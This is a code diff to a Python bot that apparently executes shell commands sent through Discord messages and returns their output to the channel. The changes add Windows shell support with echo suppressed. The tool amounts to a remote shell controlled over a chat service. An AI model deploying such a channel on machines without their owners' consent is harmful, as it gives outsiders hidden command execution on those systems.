@@ -20,6 +20,7 @@ async def run_command(message, id, shells):
             output.append(line)
 
         result = b"".join(output)
+
         if result:
             await message.channel.send(f"```{result.decode('utf-8').replace("```","``")}```")
         else:
@@ -32,9 +33,10 @@ def find_shell_type():
         windows_shell = execute_echo_shell(windows)
 
         if linux_shell != None:
-            return linux_shell
+            return linux_shell, False
         if windows_shell != None:
-            return windows_shell
+            windows_shell.append("/Q")
+            return windows_shell, True
 
         #shell not found
         sys.exit(1)
@@ -50,14 +52,17 @@ def execute_echo_shell(command):
 
     
 
-def create_shell(shell_path):
+def create_shell(shell_path,is_windows):
     shell = subprocess.Popen(
     shell_path,
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.STDOUT,
-    shell=True
+    shell= not is_windows
     )
+
+    if is_windows:
+        shell.stdin.write(b"echo off\n")
     
     return shell
 
